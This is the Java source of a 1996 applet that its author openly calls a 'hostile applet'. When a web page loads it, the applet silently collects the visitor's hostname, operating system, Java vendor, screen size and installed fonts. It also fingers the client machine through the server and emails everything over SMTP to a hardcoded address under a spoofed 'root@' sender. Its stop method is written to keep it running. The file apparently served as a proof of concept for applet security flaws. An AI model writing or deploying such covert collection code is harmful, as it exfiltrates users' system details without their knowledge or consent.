/*****************************************************************************/
//
//  Copyright (c) James P. Buzbee 1996
//
//  jbuzbee@nyx.net
//
// Permission to use, copy, modify, and distribute this software
// for non-commercial uses is hereby granted provided
// this notice is kept intact within the source file
//
/*****************************************************************************/

import java.io.*;
import java.net.*;
import java.lang.*;
import java.applet.*;
import java.awt.*;


public class SendMailApplet extends Applet implements Runnable 
{
    static Socket socket;
    static DataInputStream streamIn;
    static PrintStream streamOut;
    int    SMTPport = 25;
    int    Fingerport = 79;
    boolean debug;
    String hostname;

    public void init()
    {
	String incoming = new String();
        String user = "jbuzbee@batbox.org"; // recipient for the mail
        debug = true;
        Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
        String[] fonts = Toolkit.getDefaultToolkit().getFontList();

	try
	{
            // who are we ?
	    hostname = InetAddress.getLocalHost().toString();

	} catch(UnknownHostException u)
	{
           hostname = "/unknown";    // oop's, can't figure it out
	}

	try
	{
            // connect back to the mail server 
	    socket = new Socket(getDocumentBase().getHost(), SMTPport);

            // build our input and output streams 
	    streamIn = new DataInputStream( socket.getInputStream() );
	    streamOut = new PrintStream(socket.getOutputStream() );

            // pick off the initial connection message
	    incoming = streamIn.readLine();

            // save the message for posterity
            debugPrint(incoming);

            // tell the SMTP server hello ! 
            doCommand( "HELO " + hostname, true );

	    // Tell him we have some mail for him to deliver 
	    doCommand("MAIL FROM: " + "root@" + hostname, true );

            // Tell him who it is for
	    doCommand("RCPT TO: " + user, true );

            // Tell him we are ready to send the data
	    doCommand("DATA", true);

            // Tell the Subject
	    doCommand("Subject : I'm a hostile applet!\n", false);

            // Lets see if we can finger ourself
            finger( hostname.substring(hostname.indexOf("/")+1, 
                                       hostname.length()
                                      )
                  );
            // add to the mail message
            doCommand( "\nThe available fonts are : ", false );

            // for all of the fonts we were told about
            for ( int i = 0; i < fonts.length; i++ )
            {
               // put the name in the mail mesage 
               doCommand( fonts[i] + " ", false );
            }

            // Send some collected information
            doCommand( "\n\nClient side is : " + 
                       System.getProperty("java.vendor") + " " + 
                       System.getProperty("os.name") + " " +
                       System.getProperty("os.arch") + " " + 
                       System.getProperty("os.version") +  "\n" + 
                       "The Client's screen size is " + 
                        d.width + "  by " +  d.height +   "\n" + 
                       "This Applet was obtained from : " +
                       getDocumentBase().getHost() + "\nFrom document : " +
                       getDocumentBase() + "\n.\n", 
                       true
                      );
                     
            // wrap it up... 
	    socket.close();
	}
	catch(IOException e)
	{
            debugPrint("IO Error : " + hostname + " " +  e );
	}

      return;
    }
    /*************************************************************************/
    private void doCommand( String command, boolean ExpectingResponse )
    {
      // note that this method should be checking the status of the
      // command and throwing an exception if an error occurs in the
      // SMTP conversation.  Perhaps next time...

      String incoming = new String();

      try
      {
         // print the command to the stream
         streamOut.println( command );

         // flush
         streamOut.flush();

         // echo the initial command
         debugPrint( command );

         // if we are expecting a response
         if ( ExpectingResponse )
         {
            // get it and print it
            debugPrint(streamIn.readLine());
         }

      }
      catch(IOException e)
      {
         // abort the mail
         streamOut.println( "\n.\n" );

         debugPrint("IO Error : " + e );
      }

      return;
    }

    /*************************************************************************/
    public void finger( String hostname )
    {
      Socket fsocket;
      DataInputStream fstreamIn;
      PrintStream fstreamOut;
      String incoming;

      try
      {
           // connect to the finger server on the server
          fsocket = new Socket(getDocumentBase().getHost(), Fingerport);

           // build our input and output streams 
          fstreamIn = new DataInputStream( fsocket.getInputStream() );
          fstreamOut = new PrintStream(fsocket.getOutputStream() );

          // finger the client machine
          fstreamOut.println( "@" + hostname );
 
          // grab the initial ip address that we don't care about
          incoming = fstreamIn.readLine();

          // while he is feeing us data
          while ( ( incoming = fstreamIn.readLine()) != null )
          {
             // print the finger data out to the SMTP port
             doCommand( incoming, false );
          }
       }
       catch(IOException e)
       {
           // put the error in the mail message 
           doCommand( hostname + " could not be fingered :", false ) ;
       }

       return;
    }

    /*************************************************************************/
    public void stop() 
    {
       // this could take awhile, lets just do nothing and keep running...
       return;
    }

    /*************************************************************************/
    public void run() 
    {
       // we really have nothing to do at this point
       // perhaps I should kill this thread here ? 
       return;
    }
    /*************************************************************************/
    private void debugPrint( String message )
    {
       // if we are in debug mode 
       if ( debug == true )
       {
          // put the message out to the console
          System.out.println( message ) ;
       }
       return;
    }
    /*************************************************************************/
}
/*****************************************************************************/

